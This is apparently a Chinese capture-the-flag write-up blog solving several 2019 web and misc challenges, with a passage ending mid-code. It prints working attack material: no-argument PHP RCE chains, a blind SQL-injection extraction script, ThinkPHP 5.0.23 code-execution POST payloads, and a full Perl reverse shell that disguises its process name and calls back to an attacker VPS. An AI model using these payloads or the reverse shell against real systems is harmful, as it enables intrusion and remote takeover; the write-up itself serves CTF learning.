<h2 id="decade"><a href="#decade" class="headerlink" title="decade"></a>decade</h2><p>本题参考 bytectf boring_code的无参数 RCE</p>
<p>题目进去看到一张图片，右键查看源码看到如下提示</p>
<blockquote>
<p>\&lt;!–src in /code and flag is in this page–></p>
</blockquote>
<p>按照提示，在 URL 后面添加<code>/code</code>得到源码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/1-1.png" alt="1-1"></p>
<p>内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($code)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"No way!!!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"No way!!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>回顾一下 boring_code 的 payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
<p>可以看出来在本题，不能用的函数有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">localeconv()</span><br><span class="line">time()</span><br><span class="line">localtime()</span><br><span class="line">readfile()</span><br></pre></td></tr></table></figure>
<p>主要问题有两点：①之前获取点（.）的方法失效了；②readfile() 函数需要用其他代替</p>
<p>然后直接看一下本题的 payload：</p>
<p>第一种</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">die</span>(next(file(end(scandir(chr(ord(strrev(crypt(serialize(<span class="keyword">array</span>(chdir(next(scandir(next(scandir(chr(ord(strrev(crypt(serialize(<span class="keyword">array</span>())))))))))))))))))))));</span><br></pre></td></tr></table></figure>
<p>第二种</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>(join(file(end(scandir(next(each(scandir(chr(floor(tan(tan(atan(atan(ord(cos(chdir(next(scandir(chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile()))))))))))))))))))))))))))));</span><br></pre></td></tr></table></figure>
<p>payload 还有很多种，自己去发掘，就不再一个一个分析了，自行分析</p>
<h2 id="babyt5"><a href="#babyt5" class="headerlink" title="babyt5"></a>babyt5</h2><p>原题 Write Up： <a href="https://www.jianshu.com/p/804d95f6d6fb" target="_blank" rel="noopener">https://www.jianshu.com/p/804d95f6d6fb</a></p>
<p>进入题目后直接拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line">$pos = strpos($x,<span class="string">"php"</span>);</span><br><span class="line"><span class="keyword">if</span>($pos)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"denied"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,<span class="string">"$x"</span>);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">$result = curl_exec($ch);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>dirsearch 扫到<code>flag.php</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-2.png" alt="2-2"></p>
<p>源代码中看到提示</p>
<blockquote>
<p> there is no flag /etc/hosts</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-3.png" alt="2-3"></p>
<p>查看<code>/etc/hosts</code>原代码</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-4.png" alt="2-4"></p>
<p>发现这个<code>172.18.0.2</code>，用<code>http</code>协议</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-5.png" alt="2-5"></p>
<p>尝试<code>172.18.0.2</code>，拿到提示</p>
<blockquote>
<p>\&lt;!– include $_GET[a]; –> </p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-6.png" alt="2-6"></p>
<p>存在<code>LFI</code>，并且扫描端口的结果中发现 25 号端口开放 <code>smtp</code> 服务。 于是可以联想到利用<code>gopher</code>协议打 smtp，然后再结合发现的 LFI 漏洞，得出这样的思路</p>
<blockquote>
<p>利用gopher打smtp，在日志文件中留下一句话木马，然后用 LFI 包含日志文件获取 webshell</p>
</blockquote>
<p>以上思路在本次比赛中没有复现成功，具体思路看<a href="https://www.jianshu.com/p/804d95f6d6fb" target="_blank" rel="noopener">原题 Write Up</a></p>
<p>① 如果成功将一句话写入日志，菜刀连接后拿 flag</p>
<p>② 也可以继续用 LFI 然后伪协议读取 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/2-7.png" alt="2-7"></p>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>点击<code>about</code>发现提交了<code>id</code>参数</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-1.png" alt="3-1"></p>
<p>添加单引号报错，但是只是提示<code>404</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-2.png" alt="3-2"></p>
<p>后面的尝试发现了黑名单，先列出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=-1</span><br><span class="line">or</span><br><span class="line">and</span><br><span class="line">union select</span><br><span class="line">,</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-4.png" alt="3-4"></p>
<p><strong>Bypass</strong></p>
<blockquote>
<p>① || 代替 or</p>
<p>② or 被过滤所以 information_schema 不能用，选取另一个系统表 mysql.innodb_table_stats 代替</p>
<p>③ union/**/select 或者 union%0bselect 代替 union select （中间空格替换掉）</p>
<p>④ join 代替 逗号（,）</p>
<p>⑤ 无列名注入</p>
</blockquote>
<p>尝试，发现单引号包裹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=2&apos; || &apos;1</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E4%B8%8A%E6%B5%B7CTF/3-3.png" alt="3-3"></p>
<p>做题前先将几个知识点：① 无列名注入；② join 代替逗号</p>
<p>最后 EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://47.105.183.208:29898/article.php"</span></span><br><span class="line">all_str = string.printable</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_str:</span><br><span class="line">        <span class="comment">#id = "0' || ascii(substring((select group_concat(table_name) from mysql.innodb_table_stats) from %d))=%d || '1'='0"%(i,ord(j))</span></span><br><span class="line">        <span class="comment">#id = "0' || ascii(substring((select group_concat(database_name) from mysql.innodb_table_stats) from %d))=%d || '1'='0"%(i,ord(j))</span></span><br><span class="line">        <span class="comment">#id = "0' || ascii(substring((select group_concat(e.3) from (select * from (select 1)a join (select 2)b join (select 3)c union/**/select * from cccttffff.fl111aa44a99g)e) from %d))=%d || '1'='0"%(i,ord(j))</span></span><br><span class="line">        </span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">'id'</span>:id</span><br><span class="line">        &#125;</span><br><span class="line">        rep = requests.get(url,params=param)</span><br><span class="line">        <span class="comment">#print(rep.text)</span></span><br><span class="line">        <span class="comment">#print(param)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'23333333'</span> <span class="keyword">in</span> rep.text:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>该题表名前要加数据库名，不然注不出来</p>
<hr>
<p><strong>Reference</strong></p>
<p> <a href="https://www.cnblogs.com/BOHB-yunying/p/11616311.html" target="_blank" rel="noopener">https://www.cnblogs.com/BOHB-yunying/p/11616311.html</a></p>
<p> <a href="https://www.jianshu.com/p/80ce73919edb" target="_blank" rel="noopener">https://www.jianshu.com/p/80ce73919edb</a></p>
<p> <a href="https://baijiahao.baidu.com/s?id=1644976360202625042&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1644976360202625042&amp;wfr=spider&amp;for=pc</a></p>
<p> <a href="https://www.jianshu.com/p/6eba3370cfab" target="_blank" rel="noopener">https://www.jianshu.com/p/6eba3370cfab</a></p>
<hr>
<p><strong>Write Up</strong></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU3MzczNDg1OQ==&amp;mid=2247484270&amp;idx=1&amp;sn=7958756c27236039713d7b8fd0a1348c&amp;chksm=fd3c69caca4be0dc180ff10d83dae8642f618709f0ebcbb3bf6c33942edeae0c42d6ce85ac48&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1572946533094&amp;sharer_shareid=9acc96b64dfbde0e292e6ebcb72488d2#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU3MzczNDg1OQ==&amp;mid=2247484270&amp;idx=1&amp;sn=7958756c27236039713d7b8fd0a1348c&amp;chksm=fd3c69caca4be0dc180ff10d83dae8642f618709f0ebcbb3bf6c33942edeae0c42d6ce85ac48&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1572946533094&amp;sharer_shareid=9acc96b64dfbde0e292e6ebcb72488d2#rd</a> </p>
<h1 id="湖湘杯复赛"><a href="#湖湘杯复赛" class="headerlink" title="湖湘杯复赛"></a>湖湘杯复赛</h1><p>时间：2019年11月9号</p>
<p>记录 2 道 Web 题目，2 道 Misc 题目</p>
<h2 id="untar"><a href="#untar" class="headerlink" title="untar"></a>untar</h2><p>参考文章：<a href="[&lt;https://1isten.xyz/2018/10/03/记一次对ssrf的理解/">记一次对ssrf的理解</a></p>
<p>源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">"sandbox/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $sandbox.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"url"</span>]) &amp;&amp; !preg_match(<span class="string">'/^(http|https):\/\/.*/'</span>, $_GET[<span class="string">"url"</span>]))</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    $url  = str_replace(<span class="string">"|"</span>, <span class="string">""</span>, $_GET[<span class="string">"url"</span>]);</span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($url));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">    shell_exec(<span class="string">"UNTAR "</span>.escapeshellarg(basename($info[<span class="string">"basename"</span>])));</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是一道<code>SSRF</code>题目</p>
<p>传入的参数一共只有 2 个：<code>url</code>和<code>filename</code>：① 参数 url 只能使用<code>http://</code>或者<code>https://</code>协议；② 参数 filename 经过<code>pathinfo()</code>函数处理；二者都用<code>escapeshellarg()</code>函数处理</p>
<p><strong>escapeshellarg()</strong></p>
<p>作用：给参数加上单引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(escapeshellarg(&quot;file&quot;));</span><br><span class="line">string(6) &quot;&apos;file&apos;&quot;</span><br></pre></td></tr></table></figure>
<p><strong>pathinfo()</strong></p>
<p>作用：以数组的形式返回文件路径的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(pathinfo(&quot;file&quot;));</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(4) &quot;file&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(4) &quot;file&quot;</span><br><span class="line">&#125;</span><br><span class="line">php &gt; var_dump(pathinfo(&quot;path/file.php&quot;));</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(4) &quot;path&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(8) &quot;file.php&quot;</span><br><span class="line">  [&quot;extension&quot;]=&gt;</span><br><span class="line">  string(3) &quot;php&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(4) &quot;file&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>解题思路</strong></p>
<p>弄清楚之后，我们直接看着 payload 梳理解题思路，payload 如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">第一次执行：</span><br><span class="line">?filename=URI/listen.pm&amp;url=http://Your_VPS_IP/backdoor.txt</span><br><span class="line"></span><br><span class="line">第二次执行：</span><br><span class="line">?filename=xxx&amp;url=http://Your_VPS_IP</span><br><span class="line">Ps:执行前需要在 vps 上写个重定向到 listen://listen.xyz，并且监听端口</span><br></pre></td></tr></table></figure>
<p>① 首先分析第一个 payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename=URI/listen.pm&amp;url=http://Your_VPS_IP/backdoor.txt</span><br></pre></td></tr></table></figure>
<p>看一下 pathinfo() 对我们第一个 payload 中 filename 参数的解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(pathinfo(&quot;URI/listen.pm&quot;));</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(3) &quot;URI&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(9) &quot;listen.pm&quot;</span><br><span class="line">  [&quot;extension&quot;]=&gt;</span><br><span class="line">  string(2) &quot;pm&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(6) &quot;listen&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>backdoor.txt 像参考文章说的一样，是一个<code>perl后门</code>，内容如下：</p>
<p>:alarm_clock:后门内的 ip 要记得改成你的 VPS 的 ip</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment"># perl-reverse-shell - A Reverse Shell implementation in PERL</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line"><span class="keyword">use</span> FileHandle;</span><br><span class="line"><span class="keyword">use</span> POSIX;</span><br><span class="line"><span class="keyword">my</span> $VERSION = <span class="string">"1.0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Where to send the reverse shell. Change these.</span></span><br><span class="line"><span class="keyword">my</span> $ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="keyword">my</span> $port = <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Options</span></span><br><span class="line"><span class="keyword">my</span> $daemon = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">my</span> $auth   = <span class="number">0</span>; <span class="comment"># 0 means authentication is disabled and any</span></span><br><span class="line">        <span class="comment"># source IP can access the reverse shell</span></span><br><span class="line"><span class="keyword">my</span> $authorised_client_pattern = <span class="string">qr(^127\.0\.0\.1$);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Declarations</span></span><br><span class="line"><span class="string">my $global_page = "";</span></span><br><span class="line"><span class="string">my $fake_process_name = "/usr/sbin/apache";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Change the process name to be less conspicious</span></span><br><span class="line"><span class="string">$0 = "[httpd]";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Authenticate based on source IP address if required</span></span><br><span class="line"><span class="string">if (defined($ENV&#123;'REMOTE_ADDR'&#125;)</span>) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Browser IP address appears to be: $ENV&#123;'REMOTE_ADDR'&#125;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">        <span class="keyword">unless</span> ($ENV&#123;<span class="string">'REMOTE_ADDR'</span>&#125; =~ $authorised_client_pattern) &#123;</span><br><span class="line">            cgiprint(<span class="string">"ERROR: Your client isn't authorised to view this page"</span>);</span><br><span class="line">            cgiexit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($auth) &#123;</span><br><span class="line">    cgiprint(<span class="string">"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access"</span>);</span><br><span class="line">    cgiexit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Background and dissociate from parent process if required</span></span><br><span class="line"><span class="keyword">if</span> ($daemon) &#123;</span><br><span class="line">    <span class="keyword">my</span> $pid = <span class="keyword">fork</span>();</span><br><span class="line">    <span class="keyword">if</span> ($pid) &#123;</span><br><span class="line">        cgiexit(<span class="number">0</span>); <span class="comment"># parent exits</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsid();</span><br><span class="line">    <span class="keyword">chdir</span>(<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make TCP connection for reverse shell</span></span><br><span class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</span><br><span class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</span><br><span class="line">    cgiprintpage();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</span><br><span class="line">    cgiexit();    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></span><br><span class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</span><br><span class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</span><br><span class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</span><br><span class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around print</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</span><br><span class="line">    $line .= <span class="string">"&lt;p&gt;\n"</span>;</span><br><span class="line">    $global_page .= $line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wrapper around exit</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</span><br><span class="line">    cgiprintpage();</span><br><span class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r Connection: close\r Content-Type: text\/html\r\n\r\n"</span> . $global_page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以当我们执行第一个 payload 后，会在当前目录下再创建一个<code>URI</code>目录，并且进入这个目录，再创建 listen.pm ，内容为我们的 perl后门（backdoor.txt）</p>
<p>② 接下来分析第二个 payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename=xxx&amp;url=http://Your_VPS_IP</span><br><span class="line">Ps:执行前需要在 vps 上写个重定向到 listen://listen.xyz，并且监听端口</span><br></pre></td></tr></table></figure>
<p>由于做了重定向，所以当访问我们的 VPS 时，就等同于访问<code>listen://listen.xyz</code>，但是 listen 是未定义的模块，所以会自动搜索并加载<code>URI/listen.pm</code>（pm 是 perl 脚本的后缀），也就是我们刚在上传的后门（这里因为源码中对参数 url 做了过滤，只允许 http:// 和 https:// 协议，所以不能像参考文章那样直接在 url 参数中写 listen:// ，需要做个重定向来解决）</p>
<p>重定向做完 + 端口监听 + 执行 payload 之后，就会收到 shell</p>
<p>然后执行根目录下的<code>readflag</code>就能拿到 flag</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/4-1.png" alt="4-1"></p>
<h2 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp?"></a>thinkphp?</h2><p>按照题目的提示，应该是<code>thinkphp</code>的洞。进来后要登录，先注册一个普通用户登录</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-1.png" alt="1-1"></p>
<p>然后用这个普通用户登陆进去</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-2.png" alt="1-2"></p>
<p>打算直接用一下之前刚碰到的<code>thinkphp 5.0.23</code>的<code>RCE</code>，看一下漏洞是否存在，结果直接看到版本号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://183.129.189.62:19403/?s=captcha</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-3.png" alt="1-3"></p>
<p>参考文章：<a href="https://xz.aliyun.com/t/6106#toc-0" target="_blank" rel="noopener">记一次有趣的tp5代码执行</a></p>
<p>试一下<code>scandir()</code>和<code>var_dump()</code>，扫描当前目录，直接出结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=.</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-4.png" alt="1-4"></p>
<p>然后在<code>根目录</code>下找到<code>flag</code>字样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-5.png" alt="1-5"></p>
<p>直接读取内容，拿下 flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">URL：http://183.129.189.62:19403/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST：_method=__construct&amp;method=get&amp;filter[]=readfile&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../flag</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/1-6.png" alt="1-6"></p>
<h2 id="something-in-image"><a href="#something-in-image" class="headerlink" title="something in image"></a>something in image</h2><p>解压下来一个名为<code>badimages</code>的文件，直接拿到 fl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings badimages | grep -i flag</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/2-1.png" alt="2-1"></p>
<h2 id="EzMemory"><a href="#EzMemory" class="headerlink" title="EzMemory"></a>EzMemory</h2><p>文件有点大，但是跟上一题一样，还是直接拿下 flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings mem.raw | grep -i flag&#123;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CTF/%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9B/3-1.png" alt="3-1"></p>
<h1 id="百越杯"><a href="#百越杯" class="headerlink" title="百越杯"></a>百越杯</h1><p>记录 2 道 web 题，2 道 Misc 题</p>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span> </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file = <span class="string">'index.php'</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source . <span class="string">'瑙ｆ瀽寮€濮�'</span> . <span 